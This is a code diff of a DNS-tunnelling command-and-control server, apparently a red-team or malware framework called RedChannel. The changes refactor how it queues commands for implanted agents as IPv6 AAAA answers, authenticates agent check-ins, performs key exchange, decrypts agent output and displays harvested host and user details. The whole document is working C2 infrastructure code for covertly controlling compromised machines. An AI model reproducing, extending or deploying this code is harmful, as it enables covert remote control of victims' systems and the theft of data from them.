@@ -15,11 +15,55 @@ import C2Module from "../modules/c2";
 
 import { implant } from "../pb/implant";
 
+/**
+     req: {
+         connection: {
+             remoteAddress: '127.0.0.1',
+            type: 'AAAA'
+        }
+    }
+    res: {
+        question[0]: {
+            type: 'AAAA',
+            name: 'dns.query.tld'
+        },
+        answer: [],
+        end: function(){}
+    }
+    */
+
+export enum C2AnswerType {
+    TYPE_A = "A",
+    TYPE_AAAA = "AAAA",
+    TYPE_PROXY = "PROXY",
+}
+export interface C2Answer {
+    name: string;
+    type: C2AnswerType;
+    data: string;
+    ttl: number;
+}
+export interface C2RequestConnection {
+    remoteAddress: string;
+    type: C2AnswerType;
+}
+export interface C2ResponseQuestion {
+    name: string;
+    type: C2AnswerType;
+}
+export interface C2MessageRequest {
+    connection: C2RequestConnection;
+}
+export interface C2MessageResponse {
+    question: C2ResponseQuestion[];
+    answer: C2Answer[];
+    end: Function;
+}
+
 // to clarify the Map()s
 export type DataId = string;
 export type DataChunk = string;
-export type SendQ = SendQItem[];
-export type SendQItem = string[];
+export type SendQEntry = string[];
 export type AgentId = string;
 export type AgentIdRandId = string;
 
@@ -31,14 +75,14 @@ export interface AgentModel {
     ip?: string;
     channel?: AgentChannel;
     allowKeyx?: boolean;
-    sendq: SendQ;
+    sendq: SendQEntry[];
     // each agent command has a map of dataId => chunks[]
     recvq: Map<implant.AgentCommand, Map<DataId, DataChunk[]>>;
 }
 
 // agent status hex string value to be appended to DNS response
 export enum AgentStatus {
-    MORE_DATA = "01",
+    NEED_MORE_DATA = "01",
     DATA_RECEIVED = "02",
     NO_DATA = "03",
     ERROR_IMPORTING_KEY = "04",
@@ -47,6 +91,8 @@ export enum AgentStatus {
     ERROR_GENERATING_KEYS = "07",
     ERROR_INVALID_MESSAGE = "08",
     ERROR_AGENT_UNKNOWN = "09",
+    ERROR_CHECKING_IN = "0a",
+    ERROR_KEYX_NOT_ALLOWED = "0b",
     ERROR_FAILED = "0f",
 }
 
@@ -132,12 +178,13 @@ export default class RedChannel {
         if (this.modules.proxy.config.enabled) this.modules.proxy.proxyFetchLoop();
     }
 
-    initAgent(agentId, channel: AgentChannel) {
+    initAgent(agentId, channel: AgentChannel, ip?: string) {
         if (!this.agents.has(agentId)) {
             this.agents.set(agentId, {
                 id: agentId,
                 secret: Buffer.from(""),
-                lastseen: 0,
+                lastseen: Date.now() / 1000,
+                ip: ip,
                 channel: channel,
                 allowKeyx: false,
                 sendq: [],
@@ -257,20 +304,20 @@ export default class RedChannel {
         if (!dataBlocks) throw new Error(`invalid encrypted payload`);
 
         // prettier-ignore
-        const totalRecords =
+        const totalIps =
             Math.floor(dataBlocks.length / Config.MAX_DATA_BLOCKS_PER_IP) +
             (dataBlocks.length % Config.MAX_DATA_BLOCKS_PER_IP == 0 ? 0 : 1);
 
         // prettier-ignore
         const totalCommands =
-            Math.floor(totalRecords / Config.MAX_RECORDS_PER_COMMAND) +
-            (totalRecords % Config.MAX_RECORDS_PER_COMMAND == 0 ? 0 : 1);
+            Math.floor(totalIps / Config.MAX_IPS_PER_COMMAND) +
+            (totalIps % Config.MAX_IPS_PER_COMMAND == 0 ? 0 : 1);
 
         const dataId = crypto.randomBytes(2).toString("hex");
 
-        let records: string[] = [];
+        let ips: string[] = [];
         let paddedBytes = 0;
-        for (let recordNum = 0; recordNum < totalRecords; recordNum++) {
+        for (let ipNum = 0; ipNum < totalIps; ipNum++) {
             const blocksPerIp = dataBlocks.splice(0, Config.MAX_DATA_BLOCKS_PER_IP);
 
             // pad the last block with trailing Fs
@@ -289,45 +336,45 @@ export default class RedChannel {
             }
 
             // prettier-ignore
-            records.push(
-                Config.RECORD_DATA_PREFIX +
+            ips.push(
+                Config.IP_DATA_PREFIX +
                 ":" +
-                padZero(recordNum.toString(16), 4) +
+                padZero(ipNum.toString(16), 4) +
                 ":" +
                 blocksPerIp.join(":")
             );
 
             // add the header record to the top of the array
-            if (totalCommands > 1 && (records.length == Config.MAX_RECORDS_PER_COMMAND - 1 || recordNum == totalRecords - 1)) {
+            if (totalCommands > 1 && (ips.length == Config.MAX_IPS_PER_COMMAND - 1 || ipNum == totalIps - 1)) {
                 // prettier-ignore
-                records.unshift(
-                    Config.RECORD_HEADER_PREFIX +
+                ips.unshift(
+                    Config.IP_HEADER_PREFIX +
                     ":" +
                     dataId +
                     ":" +
                     padZero(command.toString(16), 2) +
                     padZero(paddedBytes.toString(16), 2) +
                     ":" +
-                    padZero(totalRecords.toString(16), 4) +
+                    padZero(totalIps.toString(16), 4) +
                     ":" +
                     "0000:0000:0000:0001"
                 );
 
-                agent.sendq.push(records);
-                records = [];
+                agent.sendq.push(ips);
+                ips = [];
             }
         }
         if (totalCommands == 1) {
             // prettier-ignore
-            records.unshift(
-                Config.RECORD_HEADER_PREFIX +
+            ips.unshift(
+                Config.IP_HEADER_PREFIX +
                 ":" +
                 dataId +
                 ":" +
                 padZero(command.toString(16), 2) +
                 padZero(paddedBytes.toString(16), 2) +
                 ":" +
-                padZero(totalRecords.toString(16), 4) +
+                padZero(totalIps.toString(16), 4) +
                 ":" +
                 "0000:0000:0000:0001"
             );
@@ -336,17 +383,17 @@ export default class RedChannel {
         // set to false after keyx is received and there are no more keyx in sendq
         if (command == implant.AgentCommand.AGENT_KEYX) agent.allowKeyx = true;
 
-        if (records.length > 0) {
-            agent.sendq?.push(records);
+        if (ips.length > 0) {
+            agent.sendq?.push(ips);
             if (this.modules.proxy.config.enabled && agent.channel == AgentChannel.PROXY) {
-                await this.modules.proxy.sendToProxy(agent.id, records);
+                await this.modules.proxy.sendToProxy(agent.id, ips);
 
                 // cleanup sendq if proxying to agent
                 agent.sendq = [];
             }
         }
-        this.log.debug(`queued up ${totalRecords} records in ${totalCommands} command(s) for agent: ${agentId}`);
-        this.log.debug(`records: ${JSON.stringify(records, null, 2)}`);
+        this.log.debug(`queued up ${totalIps} records in ${totalCommands} command(s) for agent: ${agentId}`);
+        this.log.debug(`records: ${JSON.stringify(ips, null, 2)}`);
     }
 
     isCommandInSendQ(agentId, command) {
@@ -359,7 +406,7 @@ export default class RedChannel {
         const findCommand = padZero(command.toString(16), 2);
         let is = false;
         agent.sendq?.forEach((queue) => {
-            if (queue[0].substring(0, 4) == Config.RECORD_HEADER_PREFIX) {
+            if (queue[0].substring(0, 4) == Config.IP_HEADER_PREFIX) {
                 if (queue[0].substring(12, 14) == findCommand) {
                     is = true;
                     return;
@@ -369,8 +416,8 @@ export default class RedChannel {
         return is;
     }
 
-    makeIpString(last_byte) {
-        return `${Config.RECORD_HEADER_PREFIX}:0000:${padZero(implant.AgentCommand.AGENT_IGNORE.toString(16), 2)}01:0000:0000:dead:c0de:00${last_byte}`;
+    makeIpString(lastByte: string) {
+        return `${Config.IP_HEADER_PREFIX}:0000:${padZero(implant.AgentCommand.AGENT_IGNORE.toString(16), 2)}01:0000:0000:dead:c0de:00${lastByte}`;
     }
 
     /**
@@ -394,35 +441,18 @@ export default class RedChannel {
         return this.agents.get(agentId) || null;
     }
 
-    /**
-     req: {
-         connection: {
-             remoteAddress: '127.0.0.1',
-            type: 'AAAA'
-        }
-    }
-    res: {
-        question[0]: {
-            type: 'AAAA',
-            name: 'dns.query.tld'
-        },
-        answer: [],
-        end: function(){}
-    }
-    */
-    c2MessageHandler(req, res) {
-        var question = res.question[0];
-        var hostname = question.name as string;
-        var ttl = 300; // Math.floor(Math.random() 3600)
-        let channel = question.type === "PROXY" ? AgentChannel.PROXY : AgentChannel.DNS;
+    c2MessageHandler(req: C2MessageRequest, res: C2MessageResponse) {
+        const question = res.question[0];
+        const hostname = question.name;
+        const channel = question.type === "PROXY" ? AgentChannel.PROXY : AgentChannel.DNS;
 
         if (this.modules.static_dns.config[hostname]) {
             this.log.info(`static_dns: responding to request for host: '${hostname}' with ip '${this.modules.static_dns.config[hostname]}'`);
             res.answer.push({
                 name: hostname,
-                type: "A",
+                type: C2AnswerType.TYPE_A,
                 data: this.modules.static_dns.config[hostname],
-                ttl: ttl,
+                ttl: Config.C2_ANSWER_TTL_SECS,
             });
             return res.end();
         }
@@ -441,7 +471,6 @@ export default class RedChannel {
         const segments = hostname.slice(0, hostname.length - this.modules.c2.config.domain.length).split(".");
         if (segments.length < Config.EXPECTED_DATA_SEGMENTS) {
             this.log.error(`invalid message, not enough data segments (${segments.length}, expected ${Config.EXPECTED_DATA_SEGMENTS}): ${hostname}`);
-
             return res.end();
         }
 
@@ -449,92 +478,50 @@ export default class RedChannel {
         const randId: string = segments[0];
         const agentId: string = segments[1];
 
-        const floodId = agentId + randId;
-
         if (!this.agents.has(agentId)) {
-            this.initAgent(agentId, channel);
+            this.initAgent(agentId, channel, req.connection.remoteAddress);
             this.log.warn(`first ping from agent ${agentId}, src: ${req.connection.remoteAddress}, channel: ${channel}`);
             try {
                 this.sendCommandKeyx(agentId);
             } catch (ex) {
                 this.log.error(`error sending keyx: ${emsg(ex)}`);
             }
+            // upon first ping, we don't have any keyx so we will not try to decrypt any data
+            // grab the next in queue (which should be the keyx) and respond with it.
+            let answers: C2Answer[] | void;
+            try {
+                answers = this.getNextQueuedCommand(agentId, hostname);
+            } catch (ex) {
+                this.log.error(`error getting next queued command for first keyx: ${emsg(ex)}`);
+            }
+            if (answers) {
+                res.answer = res.answer.concat(answers);
+            }
+            return res.end();
         }
         const agent = this.agents.get(agentId)!;
 
-        agent.lastseen = Math.floor(Date.now() / 1000);
+        agent.lastseen = Date.now() / 1000;
         agent.ip = req.connection.remoteAddress;
 
         let command = 0;
         try {
             command = parseInt(segments[2].slice(0, 2), 16);
         } catch (ex) {
-            this.log.error(`failed to parse command: ${emsg(ex)}`);
+            this.log.error(`failed to parse command byte: ${emsg(ex)}`);
             return res.end();
         }
 
         if (!Object.values(implant.AgentCommand).includes(command)) {
-            this.log.error(`invalid command: ${command}`);
+            this.log.warn(`unknown command from ${agentId}: ${command}, ignoring...`);
             return res.end();
         }
 
-        // no need to check the incoming data, just send a queued up msg
-        if (command == implant.AgentCommand.AGENT_CHECKIN) {
-            if (channel !== agent.channel) {
-                this.log.warn(`agent ${agentId} switching channel from ${agent.channel} to ${channel}`);
-                agent.channel = channel;
-            }
-
-            if (agent.sendq?.length == 0) {
-                // 03 means no data to send
-                this.log.debug(`agent ${agentId} checking in, no data to send`);
-                res.answer.push({
-                    name: hostname,
-                    type: "AAAA",
-                    data: this.makeIpString(AgentStatus.NO_DATA),
-                    ttl: ttl,
-                });
-
-                return res.end();
-            }
-
-            // we have already responded to this agent and rand_id combination
-            // reset the flood protection timeout
-            if (this.flood.has(floodId)) {
-                clearTimeout(this.flood[floodId]);
-                this.flood.set(
-                    floodId,
-                    setTimeout(() => {
-                        this.flood.delete(floodId);
-                    }, Config.FLOOD_PROTECTION_TIMEOUT_MS)
-                );
-
-                this.log.warn(`ignoring flood from agent: ${agentId}, rid: ${randId}, command: ${command}`);
-                return res.end();
-            }
-
-            this.log.debug(`agent ${agentId} checking in, sending next queued command`);
-            const records = agent.sendq.shift();
-            if (records) {
-                records.forEach((record) => {
-                    res.answer.push({
-                        name: hostname,
-                        type: "AAAA",
-                        data: record,
-                        ttl: ttl,
-                    });
-                });
-            }
-
-            // flood protection, if the agent dns resolver retries a query, data can be lost
-            // so we ignore retries
-            this.flood.set(
-                floodId,
-                setTimeout(() => {
-                    this.flood.delete(floodId);
-                }, Config.FLOOD_PROTECTION_TIMEOUT_MS)
-            );
-
+        // we have already responded to this agent and rand_id combination
+        // reset the flood protection timeout
+        const floodId = agentId + randId;
+        if (this.isAgentFlooding(floodId)) {
+            this.log.warn(`ignoring flood from agent: ${agentId}, rid: ${randId}, command: ${command}`);
             return res.end();
         }
 
@@ -583,29 +570,18 @@ export default class RedChannel {
         // since data is not sent in sequence, array may be [undefined, undefined, 123, undefined, 321]
         if (this.countDataChunks(recvqDataId) == totalChunks) {
             const dataChunks = recvqDataId.join("");
-            recvqCommand.delete(dataId);
 
-            // process data, send back status (0f = failed, 02 = success)
-            const processStatus = this.processAgentData(agentId, command, dataChunks);
-            if (processStatus) {
-                res.answer.push({
-                    name: hostname,
-                    type: "AAAA",
-                    data: this.makeIpString(processStatus),
-                    ttl: ttl,
-                });
-            }
-
+            // process data, return answer records to send back
+            res.answer = res.answer.concat(this.processAgentData(agentId, hostname, command, dataChunks));
             return res.end();
         }
 
-        // last byte 01 indicates more data is expected
-        const moreData = this.makeIpString("01");
+        // we don't have all the chunks yet
         res.answer.push({
             name: hostname,
-            type: "AAAA",
-            data: moreData,
-            ttl: ttl,
+            type: C2AnswerType.TYPE_AAAA,
+            data: this.makeIpString(AgentStatus.NEED_MORE_DATA),
+            ttl: Config.C2_ANSWER_TTL_SECS,
         });
 
         /*if (question.type == 'CNAME') {
@@ -617,19 +593,130 @@ export default class RedChannel {
         return res.end();
     }
 
-    processAgentData(agentId, command, data): AgentStatus {
+    isAgentFlooding(floodId: string): boolean {
+        if (this.flood.has(floodId)) {
+            clearTimeout(this.flood[floodId]);
+            this.flood.set(
+                floodId,
+                setTimeout(() => {
+                    this.flood.delete(floodId);
+                }, Config.FLOOD_PROTECTION_TIMEOUT_MS)
+            );
+            return true;
+        }
+
+        // flood protection, if the agent dns resolver retries a query, data can be lost
+        // so we ignore retries
+        this.flood.set(
+            floodId,
+            setTimeout(() => {
+                this.flood.delete(floodId);
+            }, Config.FLOOD_PROTECTION_TIMEOUT_MS)
+        );
+        return false;
+    }
+
+    checkInAgent(agent: AgentModel, hostname: string, checkInPayload: string): C2Answer[] | void {
+        const agentId = agent.id;
+
+        let plaintext = "";
+        try {
+            plaintext = this.decryptAgentData(agentId, checkInPayload);
+        } catch (ex) {
+            throw new Error(`cannot decrypt checkin from ${agentId}: ${emsg(ex)}`);
+        }
+        if (!plaintext) {
+            throw new Error(`checkin payload is invalid for ${agentId}`);
+        }
+
+        if (agent.sendq?.length == 0) {
+            this.log.debug(`agent ${agentId} checking in, no data to send`);
+            return [
+                {
+                    name: hostname,
+                    type: C2AnswerType.TYPE_AAAA,
+                    data: this.makeIpString(AgentStatus.NO_DATA),
+                    ttl: Config.C2_ANSWER_TTL_SECS,
+                },
+            ];
+        }
+
+        this.log.debug(`agent ${agentId} checking in, sending next queued command`);
+        const answers = this.getNextQueuedCommand(agentId, hostname);
+        return answers;
+    }
+
+    getNextQueuedCommand(agentId: string, hostname: string): C2Answer[] | void {
+        const agent = this.agents.get(agentId);
+        if (!agent) {
+            throw new Error(`agent ${agentId} not found`);
+        }
+
+        const sendQItems = agent.sendq.shift() as SendQEntry;
+        if (!sendQItems) return [];
+
+        const answers: C2Answer[] = sendQItems.map((data) => ({
+            name: hostname,
+            type: C2AnswerType.TYPE_AAAA,
+            data: data,
+            ttl: Config.C2_ANSWER_TTL_SECS,
+        }));
+        return answers;
+    }
+
+    processAgentData(agentId: string, hostname: string, command: implant.AgentCommand, data: string): C2Answer[] {
         const agent = this.agents.get(agentId);
         if (!agent) {
             this.log.error(`agent ${agentId} not found`);
-            return AgentStatus.ERROR_AGENT_UNKNOWN;
+            return [
+                {
+                    name: hostname,
+                    type: C2AnswerType.TYPE_AAAA,
+                    data: this.makeIpString(AgentStatus.ERROR_AGENT_UNKNOWN),
+                    ttl: Config.C2_ANSWER_TTL_SECS,
+                },
+            ];
         }
 
         let plaintext = "";
         switch (command) {
+            // checkin should be authenticated (decrypt dummy data) or rogue agents can drain the queue for legitimate ones
+            case implant.AgentCommand.AGENT_CHECKIN:
+                let checkInAnswers: C2Answer[] | void = [];
+                try {
+                    checkInAnswers = this.checkInAgent(agent, hostname, data);
+                } catch (ex) {
+                    this.log.error(`failed to checkin agent: ${emsg(ex)}`);
+                    return [
+                        {
+                            name: hostname,
+                            type: C2AnswerType.TYPE_AAAA,
+                            data: this.makeIpString(AgentStatus.ERROR_CHECKING_IN),
+                            ttl: Config.C2_ANSWER_TTL_SECS,
+                        },
+                    ];
+                }
+                if (checkInAnswers) return checkInAnswers;
+                return [
+                    {
+                        name: hostname,
+                        type: C2AnswerType.TYPE_AAAA,
+                        data: this.makeIpString(AgentStatus.NO_DATA),
+                        ttl: Config.C2_ANSWER_TTL_SECS,
+                    },
+                ];
+                break;
             case implant.AgentCommand.AGENT_KEYX:
                 if (!agent.allowKeyx) {
                     this.log.error(`incoming keyx from ${agentId} not allowed, initiate keyx first`);
-                    break;
+                    return [
+                        {
+                            name: hostname,
+                            type: C2AnswerType.TYPE_AAAA,
+                            data: this.makeIpString(AgentStatus.ERROR_KEYX_NOT_ALLOWED),
+                            ttl: Config.C2_ANSWER_TTL_SECS,
+                        },
+                    ];
                 }
 
                 if (!this.crypto.privateKey) {
@@ -637,7 +724,14 @@ export default class RedChannel {
                         this.crypto.generateKeys();
                     } catch (ex) {
                         this.log.error(`failed to generate keys: ${emsg(ex)}`);
-                        return AgentStatus.ERROR_GENERATING_KEYS;
+                        return [
+                            {
+                                name: hostname,
+                                type: C2AnswerType.TYPE_AAAA,
+                                data: this.makeIpString(AgentStatus.ERROR_GENERATING_KEYS),
+                                ttl: Config.C2_ANSWER_TTL_SECS,
+                            },
+                        ];
                     }
                 }
 
@@ -646,7 +740,14 @@ export default class RedChannel {
                     agent.keyx = this.crypto.importUncompressedPublicKey(agentPubkey);
                 } catch (ex) {
                     this.log.error(`cannot import key for ${agentId}: ${emsg(ex)}`);
-                    return AgentStatus.ERROR_IMPORTING_KEY;
+                    return [
+                        {
+                            name: hostname,
+                            type: C2AnswerType.TYPE_AAAA,
+                            data: this.makeIpString(AgentStatus.ERROR_IMPORTING_KEY),
+                            ttl: Config.C2_ANSWER_TTL_SECS,
+                        },
+                    ];
                 }
                 this.log.success(`agent(${agentId}) keyx: ${agent.keyx.asPublicECKey().toString("spki")}`);
 
@@ -654,7 +755,14 @@ export default class RedChannel {
                     agent.secret = this.crypto.deriveSecret(agent.keyx, this.hashedPassword);
                 } catch (ex) {
                     this.log.error(`cannot derive secret for ${agentId}: ${emsg(ex)}`);
-                    return AgentStatus.ERROR_DERIVING_SECRET;
+                    return [
+                        {
+                            name: hostname,
+                            type: C2AnswerType.TYPE_AAAA,
+                            data: this.makeIpString(AgentStatus.ERROR_DERIVING_SECRET),
+                            ttl: Config.C2_ANSWER_TTL_SECS,
+                        },
+                    ];
                 }
                 this.log.success(`agent(${agentId}) secret: ${agent.secret?.toString("hex")}`);
 
@@ -666,7 +774,14 @@ export default class RedChannel {
                     plaintext = this.decryptAgentData(agentId, data);
                 } catch (ex) {
                     this.log.error(`cannot decrypt message from ${agentId}: ${emsg(ex)}`);
-                    return AgentStatus.ERROR_DECRYPTING_MESSAGE;
+                    return [
+                        {
+                            name: hostname,
+                            type: C2AnswerType.TYPE_AAAA,
+                            data: this.makeIpString(AgentStatus.ERROR_DECRYPTING_MESSAGE),
+                            ttl: Config.C2_ANSWER_TTL_SECS,
+                        },
+                    ];
                 }
                 this.log.success(`agent(${agentId}) output>\n ${plaintext}`);
                 break;
@@ -675,19 +790,40 @@ export default class RedChannel {
                     plaintext = this.decryptAgentData(agentId, data);
                 } catch (ex) {
                     this.log.error(`cannot decrypt message from ${agentId}: ${emsg(ex)}`);
-                    return AgentStatus.ERROR_DECRYPTING_MESSAGE;
+                    return [
+                        {
+                            name: hostname,
+                            type: C2AnswerType.TYPE_AAAA,
+                            data: this.makeIpString(AgentStatus.ERROR_DECRYPTING_MESSAGE),
+                            ttl: Config.C2_ANSWER_TTL_SECS,
+                        },
+                    ];
                 }
 
                 const sysInfo = plaintext.split(";");
                 if (sysInfo.length < 3) {
                     this.log.error(`invalid sysinfo from ${agentId}: ${plaintext}`);
-                    return AgentStatus.ERROR_INVALID_MESSAGE;
+                    return [
+                        {
+                            name: hostname,
+                            type: C2AnswerType.TYPE_AAAA,
+                            data: this.makeIpString(AgentStatus.ERROR_INVALID_MESSAGE),
+                            ttl: Config.C2_ANSWER_TTL_SECS,
+                        },
+                    ];
                 }
 
                 const userInfo = sysInfo[2].split(":");
                 if (userInfo.length < 3) {
                     this.log.error(`invalid sysinfo:userinfo from ${agentId}: ${plaintext}`);
-                    return AgentStatus.ERROR_INVALID_MESSAGE;
+                    return [
+                        {
+                            name: hostname,
+                            type: C2AnswerType.TYPE_AAAA,
+                            data: this.makeIpString(AgentStatus.ERROR_INVALID_MESSAGE),
+                            ttl: Config.C2_ANSWER_TTL_SECS,
+                        },
+                    ];
                 }
                 const displayRows = [
                     ["hostname", sysInfo[0]],
@@ -701,7 +837,14 @@ export default class RedChannel {
                 this.log.displayTable([], displayRows);
                 break;
         }
-        return AgentStatus.DATA_RECEIVED;
+        return [
+            {
+                name: hostname,
+                type: C2AnswerType.TYPE_AAAA,
+                data: this.makeIpString(AgentStatus.DATA_RECEIVED),
+                ttl: Config.C2_ANSWER_TTL_SECS,
+            },
+        ];
     }
 
     encryptPayload(data: Buffer, secret: Buffer): Buffer {
